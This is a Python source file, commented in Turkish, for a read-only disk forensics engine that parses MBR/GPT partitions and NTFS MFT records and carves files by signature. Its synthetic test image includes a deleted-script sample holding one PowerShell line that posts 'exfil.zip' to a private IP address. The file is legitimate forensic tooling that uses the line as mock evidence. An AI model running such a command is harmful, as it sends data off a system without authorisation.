"""Original Disk, MBR/GPT Partition, NTFS/MFT, Signature & File Carving Forensics Engine.

Strictly read-only binary parsing implemented with Python standard library only.
Does not rely on The Sleuth Kit or commercial forensics frameworks.
"""

import hashlib
import os
import struct
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

EPOCH_AS_FILETIME = 116444736000000000
HUNDREDS_OF_NANOSECONDS = 10000000

MBR_PARTITION_TYPES = {
    0x00: "Empty",
    0x01: "FAT12",
    0x04: "FAT16 (<32MB)",
    0x05: "Extended",
    0x06: "FAT16",
    0x07: "NTFS / exFAT",
    0x0B: "FAT32 (CHS)",
    0x0C: "FAT32 (LBA)",
    0x0E: "FAT16 (LBA)",
    0x0F: "Extended (LBA)",
    0x27: "Windows Recovery (NTFS)",
    0x82: "Linux Swap",
    0x83: "Linux Native",
    0xEE: "GPT Protective MBR",
    0xEF: "EFI System Partition",
}

FILE_SIGNATURES: List[Tuple[bytes, int, str, str, str]] = [
    (b"\xFF\xD8\xFF", 0, "JPEG", "image/jpeg", "Yüksek"),
    (b"\x89PNG\r\n\x1a\n", 0, "PNG", "image/png", "Yüksek"),
    (b"%PDF-", 0, "PDF", "application/pdf", "Yüksek"),
    (b"PK\x03\x04", 0, "ZIP / DOCX / XLSX", "application/zip", "Yüksek"),
    (b"SQLite format 3\x00", 0, "SQLite 3 Veritabanı", "application/x-sqlite3", "Yüksek"),
    (b"MZ", 0, "PE Executable (EXE/DLL)", "application/x-dosexec", "Orta"),
    (b"ElfFile\x00", 0, "Windows Event Log (EVTX)", "application/x-evtx", "Yüksek"),
    (b"regf", 0, "Windows Registry Hive", "application/x-winreg", "Yüksek"),
    (b"EVF\x09\x0d\x0a\xff\x00", 0, "EnCase E01 Image", "application/x-ewf", "Yüksek"),
    (b"\x4c\x00\x00\x00\x01\x14\x02\x00", 0, "Windows LNK Shortcut", "application/x-ms-shortcut", "Yüksek"),
    (b"SCCA", 4, "Windows Prefetch", "application/x-prefetch", "Yüksek"),
]


def filetime_to_datetime(ft: int) -> Optional[datetime]:
    """Convert 64-bit Windows FILETIME to UTC datetime; returns None if invalid/missing."""
    if ft <= EPOCH_AS_FILETIME or ft > 2650467743999999999:
        return None
    try:
        unix_ts = (ft - EPOCH_AS_FILETIME) / HUNDREDS_OF_NANOSECONDS
        return datetime.fromtimestamp(unix_ts, tz=timezone.utc).replace(tzinfo=None)
    except Exception:
        return None


def datetime_to_filetime(dt: datetime) -> int:
    """Convert naive/UTC datetime to 64-bit Windows FILETIME."""
    ts = dt.replace(tzinfo=timezone.utc).timestamp()
    return int(ts * HUNDREDS_OF_NANOSECONDS) + EPOCH_AS_FILETIME


def detect_signature(data: bytes) -> Tuple[str, str]:
    """Identify file type from magic bytes without trusting extension."""
    for sig, offset, label, _, confidence in FILE_SIGNATURES:
        if len(data) >= offset + len(sig) and data[offset:offset + len(sig)] == sig:
            return label, confidence
    if data and all(32 <= b < 127 or b in (9, 10, 13) for b in data[:64]):
        return "Düz Metin / Script", "Orta"
    return "Bilinmeyen / Ham Veri", "Düşük"


class DiskForensicsEngine:
    """Original binary forensic engine for RAW/E01 header check, MBR/GPT, NTFS/MFT & File Carving."""

    PARSER_NAME = "AdliBilisim-Original-NTFS-Engine"
    PARSER_VERSION = "1.0.0"

    def inspect_image(self, image_path: str) -> Dict[str, Any]:
        """Inspect a disk image or raw MFT file in strict read-only mode."""
        if not os.path.isfile(image_path):
            raise FileNotFoundError(f"İmaj dosyası bulunamadı: {image_path}")

        size = os.path.getsize(image_path)
        warnings: List[str] = []

        with open(image_path, "rb") as f:
            head = f.read(min(size, 1024 * 64))

        # Check EnCase E01 signature
        if head.startswith(b"EVF\x09\x0d\x0a\xff\x00"):
            warnings.append(
                "EnCase E01 (EWF) konteyner başlığı tespit edildi. Sıkıştırılmış E01 segmentleri tam disk ağacı "
                "için RAW (.dd) çalışma kopyasına dönüştürülmelidir; yalnız üst başlık doğrulandı."
            )
            return {
                "image_path": image_path,
                "image_name": os.path.basename(image_path),
                "image_size": size,
                "format": "E01 (EnCase EWF)",
                "partitions": [],
                "mft_records": [],
                "warnings": warnings,
                "header_bytes": head[:4096],
            }

        # Check if user directly opened a standalone $MFT file
        if head[:4] == b"FILE" and size >= 1024:
            records = self.parse_mft_file(image_path)
            return {
                "image_path": image_path,
                "image_name": os.path.basename(image_path),
                "image_size": size,
                "format": "Standalone $MFT",
                "partitions": [{
                    "index": 1,
                    "scheme": "MFT",
                    "type_name": "Standalone $MFT Record Table",
                    "bootable": False,
                    "start_lba": 0,
                    "start_offset": 0,
                    "sector_count": size // 512,
                    "size_bytes": size,
                    "filesystem": "NTFS MFT",
                    "vbr_info": {},
                }],
                "mft_records": records,
                "warnings": warnings,
                "header_bytes": head[:4096],
            }

        # Check if volume image starts directly with NTFS VBR (no MBR)
        if len(head) >= 512 and head[3:11] == b"NTFS    ":
            vbr = self.parse_ntfs_vbr(head[:512], base_offset=0)
            mft_records = self._extract_mft_from_image(image_path, 0, vbr, warnings)
            return {
                "image_path": image_path,
                "image_name": os.path.basename(image_path),
                "image_size": size,
                "format": "RAW Volume (NTFS)",
                "partitions": [{
                    "index": 1,
                    "scheme": "VBR",
                    "type_name": "NTFS Volume",
                    "bootable": True,
                    "start_lba": 0,
                    "start_offset": 0,
                    "sector_count": vbr.get("total_sectors", size // 512),
                    "size_bytes": size,
                    "filesystem": "NTFS",
                    "vbr_info": vbr,
                }],
                "mft_records": mft_records,
                "warnings": warnings,
                "header_bytes": head[:4096],
            }

        # Otherwise parse MBR / GPT partition tables
        partitions = self.parse_partition_table(image_path, warnings)
        all_mft_records: List[Dict[str, Any]] = []

        with open(image_path, "rb") as f:
            for part in partitions:
                offset = part["start_offset"]
                if offset + 512 <= size:
                    f.seek(offset)
                    vbr_raw = f.read(512)
                    if vbr_raw[3:11] == b"NTFS    ":
                        vbr = self.parse_ntfs_vbr(vbr_raw, base_offset=offset)
                        part["filesystem"] = "NTFS"
                        part["vbr_info"] = vbr
                        recs = self._extract_mft_from_image(image_path, offset, vbr, warnings, partition_idx=part["index"])
                        all_mft_records.extend(recs)
                    elif vbr_raw[54:62] in (b"FAT16   ", b"FAT12   ") or vbr_raw[82:90] == b"FAT32   ":
                        part["filesystem"] = "FAT"
                        part["vbr_info"] = {"oem": vbr_raw[3:11].decode("ascii", "replace").strip()}
                    else:
                        part["filesystem"] = part.get("type_name", "Bilinmeyen")
                        part["vbr_info"] = {}

        if not partitions:
            warnings.append("Geçerli MBR (0x55AA) veya GPT ('EFI PART') bölüm tablosu bulunamadı.")

        return {
            "image_path": image_path,
            "image_name": os.path.basename(image_path),
            "image_size": size,
            "format": "RAW Disk Image (.dd/.raw)",
            "partitions": partitions,
            "mft_records": all_mft_records,
            "warnings": warnings,
            "header_bytes": head[:4096],
        }

    def parse_partition_table(self, image_path: str, warnings: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """Parse MBR and GPT partition entries from sector 0 / LBA 1."""
        if warnings is None:
            warnings = []
        partitions: List[Dict[str, Any]] = []
        size = os.path.getsize(image_path)
        if size < 512:
            warnings.append("Dosya 512 bayttan küçük olduğu için sektör analizi yapılamadı.")
            return partitions

        with open(image_path, "rb") as f:
            mbr = f.read(512)
            sig = struct.unpack("<H", mbr[510:512])[0]
            if sig != 0xAA55:
                return partitions

            has_gpt = False
            for idx in range(4):
                entry = mbr[446 + idx * 16:446 + (idx + 1) * 16]
                boot_flag, p_type = entry[0], entry[4]
                start_lba, sector_count = struct.unpack("<II", entry[8:16])
                if p_type == 0 or sector_count == 0:
                    continue
                if p_type == 0xEE:
                    has_gpt = True
                    continue
                partitions.append({
                    "index": len(partitions) + 1,
                    "scheme": "MBR",
                    "type_code": f"0x{p_type:02X}",
                    "type_name": MBR_PARTITION_TYPES.get(p_type, f"Tip 0x{p_type:02X}"),
                    "bootable": boot_flag == 0x80,
                    "start_lba": start_lba,
                    "start_offset": start_lba * 512,
                    "sector_count": sector_count,
                    "size_bytes": sector_count * 512,
                    "filesystem": "Bilinmiyor",
                    "vbr_info": {},
                })

            # Parse GPT if protective MBR detected or EFI PART signature at LBA 1
            if has_gpt or size >= 1024:
                f.seek(512)
                gpt_hdr = f.read(92)
                if len(gpt_hdr) >= 92 and gpt_hdr[:8] == b"EFI PART":
                    part_entries_lba = struct.unpack("<Q", gpt_hdr[72:80])[0]
                    num_entries, entry_size = struct.unpack("<II", gpt_hdr[80:88])
                    entries_offset = part_entries_lba * 512
                    max_read = min(num_entries, 128)
                    if entries_offset + max_read * entry_size <= size and entry_size >= 128:
                        f.seek(entries_offset)
                        raw_entries = f.read(max_read * entry_size)
                        for idx in range(max_read):
                            ent = raw_entries[idx * entry_size:(idx + 1) * entry_size]
                            type_guid_bytes = ent[0:16]
                            if type_guid_bytes == b"\x00" * 16:
                                continue
                            type_guid = str(uuid.UUID(bytes_le=type_guid_bytes))
                            first_lba, last_lba = struct.unpack("<QQ", ent[32:48])
                            part_name = ent[56:128].decode("utf-16le", errors="ignore").rstrip("\x00")
                            sectors = max(0, last_lba - first_lba + 1)
                            partitions.append({
                                "index": len(partitions) + 1,
                                "scheme": "GPT",
                                "type_code": type_guid[:8],
                                "type_name": part_name or f"GPT ({type_guid[:8]})",
                                "bootable": False,
                                "start_lba": first_lba,
                                "start_offset": first_lba * 512,
                                "sector_count": sectors,
                                "size_bytes": sectors * 512,
                                "filesystem": "Bilinmiyor",
                                "vbr_info": {"type_guid": type_guid},
                            })
        return partitions

    def parse_ntfs_vbr(self, vbr: bytes, base_offset: int = 0) -> Dict[str, Any]:
        """Parse 512-byte NTFS Volume Boot Record ($Boot)."""
        bytes_per_sector = struct.unpack("<H", vbr[11:13])[0] or 512
        sectors_per_cluster = vbr[13] or 8
        total_sectors = struct.unpack("<Q", vbr[40:48])[0]
        mft_cluster = struct.unpack("<Q", vbr[48:56])[0]
        mft_mirr_cluster = struct.unpack("<Q", vbr[56:64])[0]
        raw_mft_rec_size = struct.unpack("<b", vbr[64:65])[0]
        if raw_mft_rec_size < 0:
            mft_record_size = 1 << abs(raw_mft_rec_size)
        else:
            mft_record_size = raw_mft_rec_size * bytes_per_sector * sectors_per_cluster
        if mft_record_size <= 0:
            mft_record_size = 1024
        vol_serial = struct.unpack("<Q", vbr[72:80])[0]
        bytes_per_cluster = bytes_per_sector * sectors_per_cluster
        return {
            "oem_id": vbr[3:11].decode("ascii", "replace").strip(),
            "bytes_per_sector": bytes_per_sector,
            "sectors_per_cluster": sectors_per_cluster,
            "bytes_per_cluster": bytes_per_cluster,
            "total_sectors": total_sectors,
            "mft_cluster": mft_cluster,
            "mft_mirr_cluster": mft_mirr_cluster,
            "mft_offset": base_offset + (mft_cluster * bytes_per_cluster),
            "mft_record_size": mft_record_size,
            "volume_serial": f"{vol_serial:016X}",
        }

    def _extract_mft_from_image(
        self,
        image_path: str,
        part_offset: int,
        vbr: Dict[str, Any],
        warnings: List[str],
        partition_idx: int = 1,
        max_records: int = 4096,
    ) -> List[Dict[str, Any]]:
        mft_offset = vbr["mft_offset"]
        rec_size = vbr["mft_record_size"]
        img_size = os.path.getsize(image_path)
        if mft_offset >= img_size:
            warnings.append(f"Bölüm {partition_idx}: $MFT başlangıç adresi (0x{mft_offset:X}) imaj boyutu dışında.")
            return []

        records: List[Dict[str, Any]] = []
        with open(image_path, "rb") as f:
            f.seek(mft_offset)
            for idx in range(max_records):
                raw = f.read(rec_size)
                if len(raw) < rec_size:
                    break
                if raw[:4] == b"\x00\x00\x00\x00":
                    continue
                if raw[:4] in (b"FILE", b"BAAD"):
                    parsed = self.parse_mft_record(raw, record_index=idx, image_offset=mft_offset + idx * rec_size)
                    parsed["partition_index"] = partition_idx
                    records.append(parsed)
                elif idx > 16:
                    # Stop scanning once outside contiguous MFT segment in image
                    break
        return records

    def parse_mft_file(self, mft_path: str, max_records: int = 8192) -> List[Dict[str, Any]]:
        """Parse a standalone $MFT file directly."""
        records: List[Dict[str, Any]] = []
        with open(mft_path, "rb") as f:
            for idx in range(max_records):
                raw = f.read(1024)
                if len(raw) < 1024:
                    break
                if raw[:4] in (b"FILE", b"BAAD"):
                    parsed = self.parse_mft_record(raw, record_index=idx, image_offset=idx * 1024)
                    parsed["partition_index"] = 1
                    records.append(parsed)
        return records

    def parse_mft_record(self, raw_record: bytes, record_index: int = 0, image_offset: int = 0) -> Dict[str, Any]:
        """Parse a single 1024-byte NTFS MFT FILE record with USA fixup."""
        buf = bytearray(raw_record)
        magic = bytes(buf[:4]).decode("ascii", "replace")
        usa_offset, usa_count = struct.unpack("<HH", buf[4:8])
        first_attr_off = struct.unpack("<H", buf[20:22])[0]
        flags = struct.unpack("<H", buf[22:24])[0]
        in_use = bool(flags & 0x0001)
        is_dir = bool(flags & 0x0002)

        # Apply Update Sequence Array (USA) fixup safely
        fixup_ok = True
        if usa_offset > 0 and usa_count > 1 and usa_offset + usa_count * 2 <= len(buf):
            usn = buf[usa_offset:usa_offset + 2]
            for sec_i in range(1, usa_count):
                sec_end = sec_i * 512 - 2
                if sec_end + 2 <= len(buf):
                    if buf[sec_end:sec_end + 2] != usn:
                        fixup_ok = False
                    rep = buf[usa_offset + sec_i * 2:usa_offset + (sec_i + 1) * 2]
                    buf[sec_end:sec_end + 2] = rep

        created = modified = mft_modified = accessed = None
        best_filename = ""
        parent_mft_ref: Optional[int] = None
        real_size = 0
        resident_data = b""
        is_resident = False
        attr_list: List[str] = []

        off = first_attr_off
        while 0 < off < len(buf) - 8:
            attr_type = struct.unpack("<I", buf[off:off + 4])[0]
            if attr_type == 0xFFFFFFFF:
                break
            attr_len = struct.unpack("<I", buf[off + 4:off + 8])[0]
            if attr_len < 16 or off + attr_len > len(buf):
                break
            non_resident = buf[off + 8]

            if attr_type == 0x10 and non_resident == 0:
                attr_list.append("$STANDARD_INFORMATION")
                c_off = struct.unpack("<H", buf[off + 20:off + 22])[0]
                if off + c_off + 32 <= len(buf):
                    c_ft, m_ft, mm_ft, a_ft = struct.unpack("<QQQQ", buf[off + c_off:off + c_off + 32])
                    created = filetime_to_datetime(c_ft)
                    modified = filetime_to_datetime(m_ft)
                    mft_modified = filetime_to_datetime(mm_ft)
                    accessed = filetime_to_datetime(a_ft)

            elif attr_type == 0x30 and non_resident == 0:
                attr_list.append("$FILE_NAME")
                c_off = struct.unpack("<H", buf[off + 20:off + 22])[0]
                fn_base = off + c_off
                if fn_base + 66 <= len(buf):
                    p_ref = struct.unpack("<Q", buf[fn_base:fn_base + 8])[0] & 0x0000FFFFFFFFFFFF
                    fn_real_size = struct.unpack("<Q", buf[fn_base + 48:fn_base + 56])[0]
                    name_len = buf[fn_base + 64]
                    namespace = buf[fn_base + 65]
                    name_end = fn_base + 66 + name_len * 2
                    if name_end <= len(buf):
                        name = bytes(buf[fn_base + 66:name_end]).decode("utf-16le", errors="replace")
                        # Prefer Win32/POSIX/Win32&DOS (0, 1, 3) over DOS 8.3 (2)
                        if not best_filename or namespace != 2:
                            best_filename = name
                            parent_mft_ref = p_ref
                            if real_size == 0 and fn_real_size > 0:
                                real_size = fn_real_size

            elif attr_type == 0x80:
                attr_list.append("$DATA")
                if non_resident == 0:
                    is_resident = True
                    c_len = struct.unpack("<I", buf[off + 16:off + 20])[0]
                    c_off = struct.unpack("<H", buf[off + 20:off + 22])[0]
                    if off + c_off + c_len <= len(buf):
                        resident_data = bytes(buf[off + c_off:off + c_off + c_len])
                        real_size = c_len
                else:
                    if off + 56 <= len(buf):
                        real_size = struct.unpack("<Q", buf[off + 48:off + 56])[0]

            off += attr_len

        sig_label, sig_conf = ("Dizin", "Yüksek") if is_dir else detect_signature(resident_data)
        return {
            "record_index": record_index,
            "image_offset": image_offset,
            "magic": magic,
            "fixup_ok": fixup_ok,
            "in_use": in_use,
            "is_deleted": not in_use,
            "is_dir": is_dir,
            "filename": best_filename or f"<Adsız Kayıt #{record_index}>",
            "parent_mft_ref": parent_mft_ref,
            "size": real_size,
            "is_resident": is_resident,
            "resident_data": resident_data,
            "sha256": hashlib.sha256(resident_data).hexdigest() if resident_data else "-",
            "signature_type": sig_label,
            "signature_confidence": sig_conf,
            "created": created,
            "modified": modified,
            "mft_modified": mft_modified,
            "accessed": accessed,
            "attributes": attr_list,
            "raw_bytes": bytes(raw_record),
        }

    def carve_signatures(self, image_path: str, max_scan_bytes: int = 16 * 1024 * 1024) -> List[Dict[str, Any]]:
        """Scan raw binary stream for known file headers (File Carving discovery)."""
        if not os.path.isfile(image_path):
            raise FileNotFoundError(image_path)

        carved: List[Dict[str, Any]] = []
        with open(image_path, "rb") as f:
            data = f.read(max_scan_bytes)

        for sig, sig_off, label, mime, confidence in FILE_SIGNATURES:
            start = 0
            while True:
                pos = data.find(sig, start)
                if pos == -1:
                    break
                actual_off = pos - sig_off
                if actual_off >= 0:
                    preview = data[actual_off:actual_off + 512]
                    # Estimate carved size up to next known footer or 4KB bounded block for preview
                    est_size = len(preview)
                    if label == "JPEG":
                        eoi = data.find(b"\xFF\xD9", pos)
                        if eoi != -1 and (eoi - actual_off) <= 1024 * 1024:
                            est_size = (eoi + 2) - actual_off
                    elif label == "PDF":
                        eof = data.find(b"%%EOF", pos)
                        if eof != -1 and (eof - actual_off) <= 2 * 1024 * 1024:
                            est_size = (eof + 5) - actual_off

                    carved.append({
                        "offset": actual_off,
                        "offset_hex": f"0x{actual_off:08X}",
                        "type": label,
                        "mime": mime,
                        "estimated_size": est_size,
                        "confidence": confidence,
                        "method": "Header/Footer Signature Carving (Salt Okunur)",
                        "sha256_head": hashlib.sha256(data[actual_off:actual_off + est_size]).hexdigest(),
                        "preview_bytes": data[actual_off:actual_off + min(est_size, 4096)],
                    })
                start = pos + len(sig)
                if len(carved) >= 500:
                    return carved

        carved.sort(key=lambda x: x["offset"])
        return carved


def create_synthetic_ntfs_image(output_path: str) -> str:
    """Create a forensically valid synthetic MBR + NTFS VBR + $MFT disk image for testing & demo."""
    os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
    part_start_lba = 128
    part_sectors = 512
    total_size = (part_start_lba + part_sectors) * 512
    img = bytearray(total_size)

    # 1. MBR at LBA 0
    # Partition 1: bootable 0x80, type 0x07 (NTFS), start LBA 128, sectors 512
    img[446:462] = struct.pack("<B3sB3sII", 0x80, b"\x00\x00\x00", 0x07, b"\x00\x00\x00", part_start_lba, part_sectors)
    img[510:512] = b"\x55\xAA"

    # 2. NTFS VBR at LBA 128 (offset 65536)
    vbr_off = part_start_lba * 512
    img[vbr_off:vbr_off + 3] = b"\xEB\x52\x90"
    img[vbr_off + 3:vbr_off + 11] = b"NTFS    "
    struct.pack_into("<H", img, vbr_off + 11, 512)   # bytes/sector
    img[vbr_off + 13] = 8                             # sectors/cluster (4096 bytes)
    struct.pack_into("<Q", img, vbr_off + 40, part_sectors)
    struct.pack_into("<Q", img, vbr_off + 48, 4)      # MFT starts at cluster 4 (offset +16384)
    struct.pack_into("<Q", img, vbr_off + 56, 8)
    struct.pack_into("<b", img, vbr_off + 64, -10)    # MFT record size = 2^10 = 1024
    struct.pack_into("<Q", img, vbr_off + 72, 0xA4B2C8D199001122)
    img[vbr_off + 510:vbr_off + 512] = b"\x55\xAA"

    def build_mft_record(filename: str, parent_ref: int, in_use: bool, is_dir: bool,
                         created_dt: datetime, mod_dt: datetime, payload: bytes = b"") -> bytes:
        rec = bytearray(1024)
        rec[0:4] = b"FILE"
        struct.pack_into("<HH", rec, 4, 48, 3)  # USA offset 48, count 3
        struct.pack_into("<H", rec, 20, 56)     # First attr offset 56
        flags = (0x01 if in_use else 0x00) | (0x02 if is_dir else 0x00)
        struct.pack_into("<H", rec, 22, flags)
        # USA sequence number = 1
        struct.pack_into("<HHH", rec, 48, 1, 0, 0)

        pos = 56
        # $STANDARD_INFORMATION (0x10)
        si_body = struct.pack("<QQQQI", datetime_to_filetime(created_dt), datetime_to_filetime(mod_dt),
                              datetime_to_filetime(mod_dt), datetime_to_filetime(mod_dt), 0x20)
        si_len = 24 + len(si_body)
        struct.pack_into("<IIBBHHH", rec, pos, 0x10, si_len, 0, 0, 0, 24, 0)
        struct.pack_into("<I", rec, pos + 16, len(si_body))
        struct.pack_into("<H", rec, pos + 20, 24)
        rec[pos + 24:pos + 24 + len(si_body)] = si_body
        pos += si_len

        # $FILE_NAME (0x30)
        name_utf16 = filename.encode("utf-16le")
        fn_body = bytearray(66 + len(name_utf16))
        struct.pack_into("<Q", fn_body, 0, parent_ref)
        struct.pack_into("<QQ", fn_body, 40, len(payload), len(payload))
        fn_body[64] = len(filename)
        fn_body[65] = 1  # Win32
        fn_body[66:] = name_utf16
        fn_len = (24 + len(fn_body) + 7) & ~7
        struct.pack_into("<I", rec, pos, 0x30)
        struct.pack_into("<I", rec, pos + 4, fn_len)
        rec[pos + 8] = 0
        struct.pack_into("<I", rec, pos + 16, len(fn_body))
        struct.pack_into("<H", rec, pos + 20, 24)
        rec[pos + 24:pos + 24 + len(fn_body)] = fn_body
        pos += fn_len

        # $DATA (0x80) resident
        if not is_dir:
            data_len = (24 + len(payload) + 7) & ~7
            if pos + data_len + 4 <= 1024:
                struct.pack_into("<I", rec, pos, 0x80)
                struct.pack_into("<I", rec, pos + 4, data_len)
                rec[pos + 8] = 0
                struct.pack_into("<I", rec, pos + 16, len(payload))
                struct.pack_into("<H", rec, pos + 20, 24)
                rec[pos + 24:pos + 24 + len(payload)] = payload
                pos += data_len

        struct.pack_into("<I", rec, pos, 0xFFFFFFFF)
        # Write USN marker at sector boundaries (510 and 1022)
        struct.pack_into("<H", rec, 510, 1)
        struct.pack_into("<H", rec, 1022, 1)
        return bytes(rec)

    mft_off = vbr_off + 4 * 4096
    now = datetime(2026, 11, 20, 14, 30, 0)
    samples = [
        (0, "$MFT", 5, True, False, now, now, b""),
        (5, ".", 5, True, True, now, now, b""),
        (6, "gizli_rapor.pdf", 5, True, False, datetime(2026, 11, 18, 9, 12), datetime(2026, 11, 19, 17, 45),
         b"%PDF-1.7\n1 0 obj\n<< /Title (Gizli Finans Raporu) >>\nendobj\n%%EOF"),
        (7, "musteri_export.xlsx", 5, True, False, datetime(2026, 11, 19, 10, 0), datetime(2026, 11, 19, 11, 20),
         b"PK\x03\x04\x14\x00\x06\x00[Content_Types].xml"),
        (8, "silinen_kanit.jpg", 5, False, False, datetime(2026, 11, 17, 21, 5), datetime(2026, 11, 17, 21, 8),
         b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00SYNTHETIC_JPEG_EVIDENCE\xFF\xD9"),
        (9, "silinen_betik.ps1", 5, False, False, datetime(2026, 11, 20, 2, 15), datetime(2026, 11, 20, 2, 16),
         b"Invoke-WebRequest -Uri http://10.0.0.5/exfil.zip -Method Post"),
    ]

    for idx, fname, pref, active, is_d, cdt, mdt, pay in samples:
        rec_bytes = build_mft_record(fname, pref, active, is_d, cdt, mdt, pay)
        img[mft_off + idx * 1024:mft_off + (idx + 1) * 1024] = rec_bytes

    with open(output_path, "wb") as f:
        f.write(img)

    return output_path
